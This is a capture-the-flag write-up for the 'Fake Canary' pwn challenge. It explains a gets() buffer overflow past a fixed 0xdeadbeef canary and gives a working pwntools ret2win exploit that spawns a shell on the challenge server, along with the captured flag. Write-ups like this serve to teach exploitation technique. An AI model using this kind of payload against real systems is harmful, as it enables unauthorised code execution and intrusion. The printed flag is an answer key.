# Fake Canary

## Challenge Description
`Description: Here at Stack Smasher Inc, we protect all our stacks with industry grade canaries!`

## Solution
> TLDR: Spray 40 random characters to fill up the array, then provide 0xdeadbeef value (so that the value of the fake canary is not modified), spray 8 random characters to overwrite the stored rbp, provide the address of `ret` gadget (to fix misalignment issue) and lastly, provide the address of win() function (to spawn a shell).

Ghidra's decompiled main() function
``` c
undefined8 main(void)
{
  char local_38 [40];
  long local_10;
  
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stdin,(char *)0x0,2,0);
  local_10 = 0xdeadbeef;
  puts("Welcome to Stack Smasher!");
  puts("What\'s your name?");
  gets(local_38);
  if (local_10 != 0xdeadbeef) {
    puts("**HACKER DETECTED! Program aborted**");
                    /* WARNING: Subroutine does not return */
    exit(-1);
  }
  return 0;
}
```

The vulnerability lies on `gets(local_38)`. This line of code is vulnerable to buffer overflow.

Ghidra's decompiled win() function
``` c
void win(void)
{
  system("/bin/sh");
  return;
}
```

To spawn a shell, I need to call this function.

Before I craft my exploit, I need to find a `ret` gadget to fix the misalignment issue:
``` python
$ python3 Ropper.py -f ../fake_canary --search "ret"                   
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: ret

[INFO] File: ../fake_canary
0x0000000000400542: ret 0x200a; 
0x0000000000400536: ret;
```

Idea: Spray 40 random characters to fill up the array, then provide 0xdeadbeef value (so that the value of the fake canary is not modified), spray 8 random characters to overwrite the stored rbp, provide the address of `ret` gadget (to fix misalignment issue) and lastly, provide the address of win() function (to spawn a shell).

Working POC:
```python
from pwn import *

canary = p64(0xdeadbeef)
winAddr = p64(0x400725)
ret = p64(0x0000000000400536)
payload = ("A"*40).encode() + canary + ("A"*8).encode() + ret + winAddr

r = remote('chal.imaginaryctf.org', 42002)
#r = process('./fake_canary')
#pause()
r.recvuntil(b'your name?\n')
r.sendline(payload)
r.interactive()
```

Output of the POC:
``` bash
$ python3 fakecanary.py
[+] Opening connection to chal.imaginaryctf.org on port 42002: Done
[*] Switching to interactive mode
$ ls
flag.txt
run
$ cat flag.txt
ictf{m4ke_y0ur_canaries_r4ndom_f492b211}
```

Flag: `ictf{m4ke_y0ur_canaries_r4ndom_f492b211}`
